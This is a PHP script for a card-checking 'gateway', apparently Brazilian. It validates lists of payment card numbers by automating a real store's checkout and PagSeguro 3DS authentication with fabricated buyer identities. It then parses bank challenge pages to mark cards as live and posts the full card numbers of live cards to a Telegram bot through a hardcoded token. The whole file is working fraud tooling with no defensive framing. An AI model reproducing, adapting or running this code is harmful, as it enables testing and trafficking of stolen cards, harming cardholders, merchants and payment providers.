<?php
// ALL BINS GG GATEWAY - PagSeguro 3DS Challenge
@ini_set('output_buffering', 'off');
@ini_set('zlib.output_compression', false);
@ini_set('implicit_flush', true);
ob_implicit_flush(true);
while (ob_get_level() > 0) ob_end_flush();
error_reporting(0);


$PUBLIC_KEY_BASE64 = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0n4l5SEJovMAbXGFFWBzs92EjFfXUV7bEFoTVF6UfMKbgo+Hrgfn7vS+qRKAOP/hPNSDvAIMjU2nSn9DkdF8Xy2EBWVX2nI6umgZ/5wE62s87zzzNt0f76SyjJ6yWlyy0RyF+0to11lW3qb6up6Ytjziejli8JwUItx+YujX9TGDoxanJP6niyUm61zViPuMMAR6mjQDDH7NYV5lDKmmynA0OKYgRFM7ZweoccNI9ZfYY6/feUqo5UigvyuTL9J+nG/dGimVWBKuKcig6sIn1JvGh9CsLVq9Juc75uQdFSFpftNAYIKl/xWpzbux4gJMokw47mIWIsnoXGVmykXwRQIDAQAB';


function gerarCpfApi() {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.4devs.com.br/ferramentas_online.php');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'acao' => 'gerar_cpf',
        'pontuacao' => 'S',
        'cpf_estado' => ''
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $resposta = curl_exec($ch);
    curl_close($ch);

    if (preg_match('/\d{3}\.\d{3}\.\d{3}-\d{2}/', $resposta, $matches)) {
        return $matches[0];
    }
    return null;
}

function gerarNome() {
    $nomes = ["Ana", "Carlos", "Fernanda", "Lucas", "Juliana", "Ricardo", "Mariana", "Pedro", "Beatriz", "Rafael"];
    $sobrenomes = ["Silva", "Souza", "Oliveira", "Pereira", "Costa", "Rodrigues", "Almeida", "Santos", "Ferreira", "Lima"];
    return $nomes[array_rand($nomes)] . ' ' . $sobrenomes[array_rand($sobrenomes)];
}

function gerarTelefone() {
    $ddd = ["11", "21", "31", "41", "51", "61", "71", "81", "91"];
    return '(' . $ddd[array_rand($ddd)] . ') ' . rand(90000, 99999) . '-' . rand(1000, 9999);
}

function gerarEmail($nome) {
    $dominio = ['gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com'];
    $primeiroNome = strtolower(explode(" ", $nome)[0]);
    return $primeiroNome . rand(1000, 9999) . '@' . $dominio[array_rand($dominio)];
}

function decodeHtmlEntities($text) {
    $entities = [
        "&nbsp;" => " ", "&aacute;" => "á", "&eacute;" => "é", "&iacute;" => "í",
        "&oacute;" => "ó", "&uacute;" => "ú", "&atilde;" => "ã", "&otilde;" => "õ",
        "&acirc;" => "â", "&ecirc;" => "ê", "&icirc;" => "î", "&ocirc;" => "ô",
        "&ucirc;" => "û", "&ccedil;" => "ç", "&Aacute;" => "Á", "&Eacute;" => "É",
        "&Iacute;" => "Í", "&Oacute;" => "Ó", "&Uacute;" => "Ú", "&Atilde;" => "Ã",
        "&Otilde;" => "Õ", "&Acirc;" => "Â", "&Ecirc;" => "Ê", "&Icirc;" => "Î",
        "&Ocirc;" => "Ô", "&Ucirc;" => "Û", "&Ccedil;" => "Ç", "&quot;" => '"',
        "&amp;" => "&", "&lt;" => "<", "&gt;" => ">"
    ];
    return str_replace(array_keys($entities), array_values($entities), $text);
}

function encryptCard($number, $month, $year, $cvv) {
    global $PUBLIC_KEY_BASE64;
    
    $pan = preg_replace('/\D/', '', $number);
    $month = str_pad($month, 2, '0', STR_PAD_LEFT);
    $year = strlen($year) == 2 ? '20' . $year : $year;
    $holder = "TITULAR DO CARTAO";
    $timestamp = round(microtime(true) * 1000);
    
    $payload = "$pan;$cvv;$month;$year;$holder;$timestamp";
    
    $lines = str_split($PUBLIC_KEY_BASE64, 64);
    $pem = "-----BEGIN PUBLIC KEY-----\n" . implode("\n", $lines) . "\n-----END PUBLIC KEY-----";
    
    $publicKey = openssl_pkey_get_public($pem);
    if (!$publicKey) {
        return null;
    }
    
    openssl_public_encrypt($payload, $encrypted, $publicKey, OPENSSL_PKCS1_PADDING);
    return base64_encode($encrypted);
}

function extractPagSeguroSession($html) {
    if (preg_match('/var\s+pagseguro_connect_3d_session\s*=\s*[\'"]([^\'"]+)[\'"]/i', $html, $match)) {
        return $match[1];
    }
    return null;
}

function extractAuthenticationId($responseBody) {
    $json = json_decode($responseBody, true);
    if ($json && isset($json['id'])) {
        return $json['id'];
    }
    
    if (preg_match('/3ds\/authentications\/(3DS_[A-Z0-9-]+)/i', $responseBody, $match)) {
        return $match[1];
    }
    
    return null;
}

function extractChallengeData($responseBody) {
    $json = json_decode($responseBody, true);
    if ($json && isset($json['status']) && $json['status'] === 'REQUIRE_CHALLENGE' && isset($json['challenge'])) {
        return [
            'acsUrl' => $json['challenge']['acsUrl'],
            'payload' => $json['challenge']['payload']
        ];
    }
    return null;
}

function extractBankFields($html) {
    if (stripos($html, 'AUTH_FLOW_COMPLETED') !== false) {
        return "erro: AUTH_FLOW_COMPLETED";
    }
    
    // Special handling for Bradesco specific messages
    // Check for EXACT phrase that indicates approval (case-sensitive)
    if (strpos($html, 'Sua compra não pôde ser concluída, informe código 60 ao atendente via Central de Atendimento') !== false) {
        return "Sua compra não pôde ser concluída, informe código 60 ao atendente via Central de Atendimento";
    }
    
    // Check for device security error - should be treated as REPROVED
    if (preg_match('/Erro identificar dispositivo de segurança/i', $html)) {
        return "Compra não concluída. Erro identificar dispositivo de segurança";
    }
    
    // Improved pattern matching for complete messages
    $patterns = [
        // Capture both Body1 and Body2 together for complete message
        '/<p[^>]*id="Body1"[^>]*>(.*?)<\/p>.*?<p[^>]*id="Body2"[^>]*>(.*?)<\/p>/is',
        // Capture FWFErrorMessage content
        '/<div[^>]*id="FWFErrorMessage"[^>]*>.*?<strong>(.*?)<\/strong>.*?<\/div>/is',
        // Original patterns as fallback
        '/<div[^>]*class="challengeInfoText"[^>]*>(.*?)<\/div>/is',
        '/id="CredentialId-0a-label"[^>]*>(.*?)<\/label>/is',
        '/<div[^>]*class="container_body_text"[^>]*>(.*?)<\/div>/is',
        '/id="info_message_auth"[^>]*>(.*?)<\/div>/is',
        '/<p[^>]*id="Body1"[^>]*>(.*?)<\/p>/is',
        '/whyInfo-content-inner[^>]*><p[^>]*>([^<]+)<\/p>/is',
        '/<p[^>]*class="challenge-info-sub-header"[^>]*>(.*?)<\/p>/is'
    ];
    
    $extracted = "";
    foreach ($patterns as $index => $pattern) {
        if (preg_match($pattern, $html, $match)) {
            if ($index === 0 && isset($match[1]) && isset($match[2])) {
                // Special handling for Body1 + Body2 combination
                $body1 = strip_tags($match[1]);
                $body2 = strip_tags($match[2]);
                $combined = trim($body1 . " " . $body2);
                $combined = preg_replace('/\s+/', ' ', $combined);
                $combined = decodeHtmlEntities($combined);
                if (!empty($combined)) {
                    $extracted .= $combined . " ";
                }
            } else {
                // Normal handling for other patterns
                $text = isset($match[1]) ? strip_tags($match[1]) : (isset($match[0]) ? strip_tags($match[0]) : '');
                $text = preg_replace('/\s+/', ' ', $text);
                $text = decodeHtmlEntities(trim($text));
                if (!empty($text)) {
                    $extracted .= $text . " ";
                }
            }
        }
    }
    
    $result = trim($extracted);
    if (empty($result)) {
        return "RAW_RESPONSE: Nenhum campo extraído (DIE)";
    }
    
    return $result;
}

function extrairCodigoErro($mensagem) {
    // Padrões de códigos de erro conhecidos que indicam LIVE
    $codigosLive = [
        // VISA
        '/\bN7\b/i' => 'N7',
        '/\b54\b/' => '54',
        '/\b1045\b/' => '1045',
        '/\b1001\b/' => '1001',
        
        // ELO
        '/\b63\b/' => '63',
        
        // MASTERCARD
        '/\b83\b/' => '83',
        '/\b12\b/' => '12',
        
        // MASTERCARD SICREDI
        '/\bVBV\b/i' => 'VBV',
        
        // MASTERCARD BB
        '/\b1015\b/' => '1015',
        
        // AMEX
        '/\bFA\b/i' => 'FA',
        '/\bA6\b/i' => 'A6',
        '/\b100\b/' => '100',
        '/\b101\b/' => '101',
        
        // Códigos adicionais comuns
        '/código\s+(\d+)/i' => 'CÓDIGO',
        '/code\s+(\d+)/i' => 'CODE',
        '/erro\s+(\d+)/i' => 'ERRO',
    ];
    
    foreach ($codigosLive as $pattern => $nome) {
        if (preg_match($pattern, $mensagem, $matches)) {
            $codigo = $matches[0];
            return "<span style='background: #4CAF50; padding: 2px 8px; border-radius: 4px; font-weight: bold; color: white;'>🎯 ALL BINS GG ➜ CÓDIGO: $codigo</span>";
        }
    }
    
    return '';
}

function consultarBinViaAPI($bin) {
    // Try primary API first
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://chellyx.shop/dados/binsearch.php?bin=' . $bin,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);
   
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
   
    if ($response && $httpCode === 200) {
        $data = json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE && is_array($data)) {
            $bandeira = $data['bandeira'] ?? $data['scheme'] ?? '';
            $level = $data['level'] ?? $data['type'] ?? '';
            $banco = $data['banco'] ?? $data['bank'] ?? '';
            $pais = $data['pais'] ?? $data['country'] ?? '';
           
            if (!empty($bandeira)) {
                return [
                    'success' => true,
                    'bandeira' => $bandeira,
                    'level' => $level,
                    'banco' => $banco,
                    'pais' => $pais,
                    'details' => trim("$bandeira $level $banco $pais")
                ];
            }
        }
    }
   
    // Try Fluidpay API as backup
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://app.fluidpay.com/api/lookup/bin/pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => array(
            'Authorization: pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
            'Content-Type: application/json',
        ),
        CURLOPT_POSTFIELDS => json_encode([
            'type' => 'tokenizer',
            'type_id' => '230685b9-61e6-4dc4-8cb2-18ef6fd93146',
            'bin' => $bin,
        ]),
        CURLOPT_SSL_VERIFYPEER => false,
    ));
    $response = curl_exec($ch);
   
    if (!curl_errno($ch)) {
        $responseData = json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE && isset($responseData['status']) && $responseData['status'] === 'success') {
            $data = $responseData['data'];
            $bandeira = $data['card_brand'] ?? '';
            $level = $data['card_level_generic'] ?? '';
            $banco = $data['issuing_bank'] ?? '';
            $pais = $data['country'] ?? '';
           
            curl_close($ch);
           
            if (!empty($bandeira)) {
                return [
                    'success' => true,
                    'bandeira' => $bandeira,
                    'level' => $level,
                    'banco' => $banco,
                    'pais' => $pais,
                    'details' => trim("$bandeira $level $banco $pais")
                ];
            }
        }
    }
   
    curl_close($ch);
    
    // Try binlist.net as third option
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://lookup.binlist.net/' . $bin,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HTTPHEADER => [
            'Accept-Version: 3',
            'User-Agent: Mozilla/5.0'
        ]
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($response && $httpCode === 200) {
        $data = json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE && is_array($data)) {
            $bandeira = strtoupper($data['scheme'] ?? '');
            $level = strtoupper($data['type'] ?? '');
            $banco = $data['bank']['name'] ?? '';
            $pais = strtoupper($data['country']['alpha2'] ?? '');
            
            if (!empty($bandeira)) {
                return [
                    'success' => true,
                    'bandeira' => $bandeira,
                    'level' => $level,
                    'banco' => $banco,
                    'pais' => $pais,
                    'details' => trim("$bandeira $level $banco $pais")
                ];
            }
        }
    }
   
    // If all APIs fail, return basic card type info
    $firstDigit = substr($bin, 0, 1);
    $bandeira = 'UNKNOWN';
    
    switch ($firstDigit) {
        case '2':
        case '5':
            $bandeira = 'MASTERCARD';
            break;
        case '3':
            $bandeira = 'AMEX';
            break;
        case '4':
            $bandeira = 'VISA';
            break;
        case '6':
            $bandeira = 'DISCOVER';
            break;
    }
   
    return [
        'success' => false,
        'bandeira' => $bandeira,
        'level' => 'CREDIT',
        'banco' => 'UNKNOWN BANK',
        'pais' => 'XX',
        'details' => "$bandeira CREDIT UNKNOWN BANK"
    ];
}

function enviarTelegramAprovado($mensagem) {
    $BOT_TOKEN = "7609728919:AAFQmjVCddPWEMtMUY1difQEP8N6BRzhVqI";
    $CHAT_ID = "7990661359";
    $msg = urlencode($mensagem);
    @file_get_contents("https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$msg&parse_mode=HTML");
}


function runFullFlow($cardLine, $proxy = null) {
    $parts = explode('|', $cardLine);
    if (count($parts) < 4) {
        return "Formato inválido";
    }
    
    list($number, $month, $year, $cvv) = array_slice($parts, 0, 4);
    
    $ch = curl_init();
    $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
    
    curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookies.txt');
    
    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
    }
    
    try {
        $encryptedHash = encryptCard($number, $month, $year, $cvv);
        if (!$encryptedHash) {
            return "Erro ao criptografar cartão";
        }
        

        curl_setopt($ch, CURLOPT_URL, "https://www.13official.com/produto/camiseta-classic-rosa/");
        curl_exec($ch);
        

        curl_setopt($ch, CURLOPT_URL, "https://www.13official.com/?wc-ajax=add_to_cart");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'attribute_pa_tamanho' => '3g',
            'quantity' => '1',
            'product_id' => '2188',
            'variation_id' => '2188'
        ]));
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "X-Requested-With: XMLHttpRequest",
            "Referer: https://www.13official.com/produto/camiseta-classic-rosa/"
        ]);
        curl_exec($ch);
        

        curl_setopt($ch, CURLOPT_URL, "https://www.13official.com/checkout/");
        curl_setopt($ch, CURLOPT_HTTPGET, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Referer: https://www.13official.com/carrinho/"]);
        $checkoutHtml = curl_exec($ch);
        
        $psSession = extractPagSeguroSession($checkoutHtml);
        if (!$psSession) {
            return "Sessão PagSeguro não encontrada";
        }

        $authPayload = [
            'amount' => ['value' => 10900, 'currency' => 'BRL'],
            'billingAddress' => [
                'street' => 'Rua Paulo de Faria',
                'number' => '6',
                'complement' => 'n/d',
                'regionCode' => 'SP',
                'country' => 'BRA',
                'city' => 'São Paulo',
                'postalCode' => '02267000'
            ],
            'customer' => [
                'name' => 'yhujik yhujik',
                'email' => 'hbgvfc@gmail.com',
                'phones' => [['country' => '55', 'area' => '99', 'number' => '992092197', 'type' => 'MOBILE']]
            ],
            'dataOnly' => false,
            'deviceInformation' => [
                'httpBrowserColorDepth' => 24,
                'httpBrowserJavaEnabled' => false,
                'httpBrowserJavaScriptEnabled' => true,
                'httpBrowserLanguage' => 'pt-BR',
                'httpBrowserScreenHeight' => 1536,
                'httpBrowserScreenWidth' => 864,
                'httpBrowserTimeDifference' => 180,
                'httpDeviceChannel' => 'Browser',
                'userAgentBrowserValue' => $userAgent
            ],
            'paymentMethod' => [
                'type' => 'CREDIT_CARD',
                'installments' => 1,
                'card' => ['encrypted' => $encryptedHash]
            ]
        ];
        
        curl_setopt($ch, CURLOPT_URL, "https://sdk.pagseguro.com/checkout-sdk/3ds/authentications");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($authPayload));
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "Authorization: $psSession",
            "Origin: https://www.13official.com",
            "Referer: https://www.13official.com/",
            "Content-Type: application/json"
        ]);
        $authResponse = curl_exec($ch);
        
        $authId = extractAuthenticationId($authResponse);
        if (!$authId) {
            $json = json_decode($authResponse, true);
            return $json['status'] ?? "Erro na autenticação";
        }
        

        curl_setopt($ch, CURLOPT_URL, "https://sdk.pagseguro.com/checkout-sdk/3ds/authentications/$authId");
        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "Authorization: $psSession",
            "Origin: https://www.13official.com",
            "Referer: https://www.13official.com/",
            "Content-Type: application/json",
            "Content-Length: 0"
        ]);
        $confirmResponse = curl_exec($ch);
        
        $challengeData = extractChallengeData($confirmResponse);
        if (!$challengeData) {
            $json = json_decode($confirmResponse, true);
            return $json['status'] ?? "Sem Challenge";
        }

        curl_setopt($ch, CURLOPT_URL, $challengeData['acsUrl']);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['creq' => $challengeData['payload']]));
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "Origin: https://www.13official.com",
            "Referer: https://www.13official.com/",
            "Content-Type: application/x-www-form-urlencoded"
        ]);
        $challengeResponse = curl_exec($ch);
        
        $message = extractBankFields($challengeResponse);
        curl_close($ch);
        
        return $message ?: "RAW_RESPONSE: $challengeResponse";
        
    } catch (Exception $e) {
        curl_close($ch);
        return "Erro: " . $e->getMessage();
    }
}



$lista = $_GET['lista'] ?? '';
$proxy = $_GET['proxy'] ?? null;

if (empty($lista)) {
    echo "<span class='badge badge-soft-danger'>#ERRO</span> ➔ Parâmetro 'lista' não fornecido ➔ USER: <b>Central21</b><br>";
    exit;
}

$lista = trim($lista);
$lista = str_replace([" ", ":", ";", ",", "=>", "-", "/", "|||"], "|", $lista);

$cards = [];
if (preg_match_all("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $lista, $matches)) {
    $cards = $matches[0];
} else {
    echo "<span class='badge badge-soft-danger'>#ERRO</span> ➔ Formato inválido. Use: numero|mm|aaaa|cvv ➔ USER: <b>Central21</b><br>";
    exit;
}


// Process only the first card for single gate testing
foreach ($cards as $card) {
    $inicio = microtime(true);
    $resultado = runFullFlow($card, $proxy);
    $tempo = round(microtime(true) - $inicio, 5);

    $resultLower = strtolower($resultado);

    // Force DIE patterns - words that indicate rejection
    $forceDiePatterns = [
        'sessão pagseguro não encontrada',
        'sessao pagseguro nao encontrada',
        'auth_flow_completed',
        'auth_not_supported',
        'raw_response',
        'nenhum campo extraído',
        'erro na',
        'erro ao',
        'cartão inválido',
        'cartao invalido',
        'transação negada',
        'transacao negada',
        'pagamento recusado',
        'saldo insuficiente',
        'ligue no número informado no verso do cartão'
    ];

    // Approved patterns - messages indicating success/approval
    $approvedPatterns = [
        'para prosseguir',
        'validar a transação',
        'validar a transacao',
        'push que será enviado',
        'push que sera enviado',
        'celular cadastrado',
        'id santander',
        'ative as suas notificações',
        'ative as suas notificacoes',
        'digite o código',
        'digite o codigo',
        'código de segurança',
        'codigo de seguranca',
        'autenticação',
        'autenticacao',
    ];

    $isLive = false;

    // Check specifically for AUTH_NOT_SUPPORTED first
    if (stripos($resultado, 'AUTH_NOT_SUPPORTED') !== false) {
        $isLive = false;
    }
    // Special handling - EXACT message required for approval (case-sensitive)
    elseif (strpos($resultado, 'Sua compra não pôde ser concluída, informe código 60 ao atendente via Central de Atendimento') !== false) {
        // EXACT message with proper accents indicates approval
        $isLive = true;
    }
    // Then check for specific rejection patterns
    elseif (stripos($resultado, 'Erro identificar dispositivo de segurança') !== false) {
        // Device security error - reject
        $isLive = false;
    }
    elseif (stripos($resultado, 'Ligue no número informado no verso do cartão para maiores informações') !== false) {
        // Generic rejection message - reject
        $isLive = false;
    }
    else {
        // First check if it's an approved message
        foreach ($approvedPatterns as $pattern) {
            if (strpos($resultLower, $pattern) !== false) {
                $isLive = true;
                break;
            }
        }
        
        // If not approved, check if it's a DIE pattern
        if (!$isLive) {
            $isLive = true; // Assume live unless proven otherwise
            foreach ($forceDiePatterns as $pattern) {
                if (strpos($resultLower, $pattern) !== false) {
                    $isLive = false;
                    break;
                }
            }
        }
    }

    // Get BIN info
    $parts = explode('|', $card);
    $ccNumber = $parts[0] ?? '';
    $binNumber = substr($ccNumber, 0, 6);
    $apiResult = consultarBinViaAPI($binNumber);
    $binInfo = $apiResult['details'] ?? 'BIN NÃO ENCONTRADA';

    sleep(5);

    // Output result
    if ($isLive) {
        $codigoDestacado = extrairCodigoErro($resultado);
        echo "[<span class='badge badge-soft-success'>#APROVADA</span>] ➔ $card ➜ <font style='color:#00ff88'>$binInfo</font> ➔ <span class='badge badge-soft-success'>[" . strtoupper($resultado) . "]</span> $codigoDestacado ➔ <b>Central21</b> ➔ Tempo: {$tempo}s<br>";
        
        // Send Telegram notification
        enviarTelegramAprovado("\u2705 <b>APROVADA</b>\n\ud83d\udcb3 <code>$card</code>\n\ud83c\udfe6 $binInfo\n\ud83d\udd01 $resultado\n\u23f1 {$tempo}s\n\ud83d\udc64 User: Central21");
    } else {
        $mensagemLimpa = str_replace('RAW_RESPONSE: ', '', $resultado);
        $codigoDestacado = extrairCodigoErro($mensagemLimpa);
        echo "[<span class='badge badge-soft-danger'>#REPROVADA</span>] ➔ $card ➜ <font style='color:#ff2000'>$binInfo</font> ➔ <span class='badge badge-soft-danger'>[" . strtoupper($mensagemLimpa) . "]</span> $codigoDestacado ➔ <b>Central21</b> ➔ Tempo: {$tempo}s<br>";
    }

    // Exit after first card (single card testing per request)
    break;
}


?>
